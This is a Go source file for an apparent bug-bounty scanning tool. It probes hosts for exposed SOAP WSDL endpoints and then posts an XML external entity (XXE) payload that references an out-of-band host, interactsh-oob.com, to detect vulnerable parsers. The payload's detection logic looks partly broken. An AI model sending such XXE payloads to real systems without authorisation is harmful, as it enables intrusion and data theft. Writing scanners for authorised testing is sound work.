package tools

import (
	"github.com/Developer-Army/BBPTS/internal/domain/recon"
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"golang.org/x/time/rate"
)

type SOAPProbeTool struct{}

func (t *SOAPProbeTool) Name() string {
	return "soap_probe"
}

func (t *SOAPProbeTool) Run(ctx context.Context, scanCtx *recon.ScanContext, targets []string, threads int) ([]recon.Event, error) {
	if len(targets) == 0 {
		return nil, nil
	}

	rateLimit := ToolRateLimitFromCtx(ctx, t.Name())
	if rateLimit <= 0 {
		rateLimit = 30
	}
	pool := NewWorkerPool(threads, rate.Limit(rateLimit))

	return pool.Process(ctx, targets, func(ctx context.Context, target string) ([]recon.Event, error) {
		target = strings.TrimSpace(target)
		if target == "" {
			return nil, nil
		}

		if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
			target = "https://" + target
		}

		parsed, err := url.Parse(target)
		if err != nil {
			return nil, nil
		}

		client := NewSafeHTTPClient(5 * time.Second)
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}

		var events []recon.Event

		// Test 1: Check SOAP Endpoint WSDL Exposure
		soapPaths := []string{
			"/?wsdl",
			"/ws?wsdl",
			"/service.asmx?wsdl",
			"/api/soap?wsdl",
		}

		for _, sPath := range soapPaths {
			wsdlURL := fmt.Sprintf("%s://%s%s", parsed.Scheme, parsed.Host, sPath)
			wReq, err := http.NewRequestWithContext(ctx, "GET", wsdlURL, nil)
			if err != nil {
				continue
			}
			for k, v := range scanCtx.Headers {
				wReq.Header.Set(k, v)
			}

			wResp, err := client.Do(wReq)
			if err == nil {
				bodyBytes, _ := io.ReadAll(io.LimitReader(wResp.Body, 512*1024))
				wResp.Body.Close()
				bodyStr := string(bodyBytes)

				if wResp.StatusCode == 200 && (strings.Contains(bodyStr, "wsdl:definitions") || strings.Contains(bodyStr, "definitions>")) {
					events = append(events, recon.NewEvent(wsdlURL, t.Name(), "discovery", map[string]string{
						"type":   "soap_wsdl",
						"source": "soap_probe",
					}))

					// Try verifying XML external entity parsing (XXE) vulnerability on active SOAP endpoint
					xxePayload := `<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
  <!ENTITY % dtd SYSTEM "http://interactsh-oob.com/xxe.dtd">
  %dtd;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>&xxe;</test>
  </soap:Body>
</soap:Envelope>`

					postURL := strings.TrimSuffix(wsdlURL, "?wsdl")
					req, err := http.NewRequestWithContext(ctx, "POST", postURL, strings.NewReader(xxePayload))
					if err == nil {
						req.Header.Set("Content-Type", "text/xml; charset=utf-8")
						for k, v := range scanCtx.Headers {
							req.Header.Set(k, v)
						}

						resp, err := client.Do(req)
						if err == nil {
							pBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
							resp.Body.Close()
							pStr := string(pBytes)

							// If server returns error about parsing external DTD or resolves, flag it
							if strings.Contains(pStr, "failed to load external entity") || strings.Contains(pStr, "error parsing dtd") {
								events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
									"vuln_name":   "XML External Entity (XXE) Injection Attempt",
									"severity":    "high",
									"url":         postURL,
									"evidence":    pStr,
									"description": fmt.Sprintf("SOAP endpoint at %s processed XXE injection payload. Parser returned XML loading error indicators.", postURL),
								}, "high"))
							}
						}
					}
				}
			}
		}

		return events, nil
	})
}

var _ recon.Tool = (*SOAPProbeTool)(nil)
